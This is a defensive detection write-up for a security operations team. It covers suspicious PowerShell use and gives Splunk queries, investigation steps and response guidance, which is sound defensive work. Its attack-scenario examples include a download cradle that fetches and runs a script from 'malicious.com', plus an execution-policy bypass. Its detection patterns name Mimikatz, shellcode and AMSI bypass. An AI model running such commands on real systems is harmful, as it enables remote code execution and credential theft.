# PowerShell Detection

## Overview

Detects suspicious PowerShell execution including encoded commands, execution policy bypasses, and download cradles.

## Detection Details

| Property | Value |
|----------|-------|
| **Detection ID** | SOC-DET-003 |
| **Severity** | High |
| **Tactics** | Execution |
| **Technique** | [T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/) |
| **Data Source** | Sysmon + PowerShell Event Log |
| **Log Source** | `Sysmon`, `Microsoft-Windows-PowerShell/Operational` |
| **Event Codes** | Sysmon 1, PowerShell 4104 |

## Description

PowerShell is frequently abused by attackers for execution, persistence, and lateral movement. This detection identifies:
- Encoded commands (Base64)
- Execution policy bypasses
- Download cradles (IEX, DownloadString)
- Hidden window execution
- Suspicious cmdlets (Invoke-Mimikatz, Invoke-Shellcode)

### Attack Scenarios

**Encoded Command:**
```powershell
$cmd = "Get-Process"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded
```

**Download Cradle:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
```

**Execution Policy Bypass:**
```powershell
powershell.exe -ExecutionPolicy Bypass -File malicious.ps1
```

## Detection Logic

### Encoded Commands

```spl
index=sysmon_events EventCode=1 (Image="*powershell.exe" OR Image="*pwsh.exe")
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-e *"
| table _time, CommandLine, User, ParentImage
```

### Execution Policy Bypass

```spl
index=sysmon_events EventCode=1
| search CommandLine="*powershell*" CommandLine="*ExecutionPolicy*" CommandLine="*Bypass*"
| table _time, CommandLine, User
```

### Download Cradles

```spl
index=powershell_logs EventCode=4104
| search ScriptBlockText="*DownloadString*" OR ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*IEX*"
| table _time, ScriptBlockText, User
```

### Hidden Window Execution

```spl
index=sysmon_events EventCode=1
| search CommandLine="*powershell*" CommandLine="*-WindowStyle*" CommandLine="*Hidden*"
| table _time, CommandLine, User
```

### Combined Detection

```spl
(index=sysmon_events EventCode=1 (Image="*powershell*" OR Image="*pwsh*")
  (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*Bypass*" OR CommandLine="*Hidden*" OR CommandLine="*-nop*"))
OR
(index=powershell_logs EventCode=4104
  (ScriptBlockText="*DownloadString*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Mimikatz*" OR ScriptBlockText="*Invoke-Shellcode*"))
| eval severity=case(
    like(CommandLine, "%Mimikatz%") OR like(ScriptBlockText, "%Mimikatz%"), "CRITICAL",
    like(CommandLine, "%-enc%") OR like(CommandLine, "%-EncodedCommand%"), "HIGH",
    1=1, "MEDIUM"
  )
| table _time, severity, CommandLine, ScriptBlockText, User
```

## Expected Results

### Normal Activity

| User | CommandLine | Result |
|------|-------------|--------|
| admin | `powershell Get-Service` | False positive |
| user1 | `powershell -File script.ps1` | Legitimate script |

### Attack Detected

| User | CommandLine | Result |
|------|-------------|--------|
| victim | `powershell -enc SQBFAFgAIAAoAE4A...` | **ALERT: Encoded** |
| victim | `powershell -ExecutionPolicy Bypass -File malware.ps1` | **ALERT: Bypass** |
| victim | `IEX (New-Object Net.WebClient).DownloadString(...)` | **ALERT: Download** |

## Alert Configuration

### Critical Alert (Mimikatz, Shellcode)

```spl
# Search
(index=sysmon_events EventCode=1 CommandLine="*Mimikatz*")
OR
(index=powershell_logs EventCode=4104 ScriptBlockText="*Mimikatz*" OR ScriptBlockText="*Invoke-Shellcode*")

# Trigger: Number of Results > 0
# Severity: Critical
```

### High Alert (Encoded Commands)

```spl
# Search
index=sysmon_events EventCode=1
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"

# Trigger: Number of Results > 0
# Severity: High
```

## Investigation Steps

### 1. Decode Base64 Commands

```spl
# Extract and decode encoded commands
index=sysmon_events EventCode=1 CommandLine="*-enc*"
| rex field=CommandLine "-enc\s+(?<encoded>[^\s]+)"
| eval decoded=base64decode(encoded)
| table _time, decoded, User
```

### 2. Identify Parent Process

```spl
# What launched PowerShell?
index=sysmon_events EventCode=1 Image="*powershell*"
| table _time, ParentImage, CommandLine, User
```

**Suspicious Parents:**
- cmd.exe (command prompt)
- wscript.exe/cscript.exe (scripting)
- mshta.exe (HTML application)
- winword.exe/excel.exe (Office macros)

### 3. Check for File Downloads

```spl
# Did PowerShell download anything?
index=sysmon_events EventCode=11 Image="*powershell*"
| table _time, TargetFilename
```

### 4. Network Connections

```spl
# Did PowerShell connect externally?
index=sysmon_events EventCode=3 Image="*powershell*"
| table _time, DestinationIp, DestinationPort
```

## Response Actions

### Immediate

1. **Kill process** - Terminate suspicious PowerShell process
2. **Network isolation** - Disconnect from network if data exfiltration suspected
3. **Capture memory** - Dump process memory for analysis

### Short-term

1. **Decode commands** - Analyze encoded PowerShell commands
2. **File analysis** - Hash and analyze any downloaded files
3. **User interview** - Determine if activity was authorized

### Long-term

1. **Constrained Language Mode** - Enable PowerShell CLM
2. **AppLocker** - Restrict PowerShell execution
3. **Logging enhancement** - Enable Script Block Logging, Module Logging

## False Positives

### Common Scenarios

1. **Admin scripts** with encoded parameters
2. **Legitimate automation** using PowerShell
3. **Software installers** that use PowerShell

### Tuning

```spl
# Exclude known admin users
index=sysmon_events EventCode=1 Image="*powershell*"
| search NOT User IN ("DOMAIN\\svc_admin", "DOMAIN\\backup_svc")
| search CommandLine="*-enc*"
```

## Testing

### Generate Test Data

```powershell
# Encoded command
$cmd = "Write-Host 'Test'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded

# Execution policy bypass
powershell.exe -ExecutionPolicy Bypass -Command "Get-Process"

# Download cradle (safe URL)
Invoke-WebRequest -Uri "http://example.com/test.txt" -UseBasicParsing
```

### Verify Detection

```spl
# Check detections fired
index=sysmon_events EventCode=1 Image="*powershell*" earliest=-1h
| search CommandLine="*-enc*" OR CommandLine="*Bypass*"
| stats count
# Should be >= 3
```

## Advanced Detections

### AMSI Bypass Detection

```spl
index=powershell_logs EventCode=4104
| search ScriptBlockText="*amsi*" AND ScriptBlockText="*bypass*"
```

### PowerShell Downgrade Attack

```spl
index=sysmon_events EventCode=1
| search CommandLine="*powershell*" CommandLine="*-Version*" CommandLine="*2*"
```

## References

- [MITRE ATT&CK T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [PowerShell Logging](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [PowerShell Empire](https://github.com/BC-SECURITY/Empire)

## Changelog

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2024-01-25 | 1.0 | SOC Team | Initial detection |
| 2024-02-20 | 1.1 | SOC Team | Added Base64 decoding |
| 2024-03-15 | 1.2 | SOC Team | Added AMSI bypass detection |
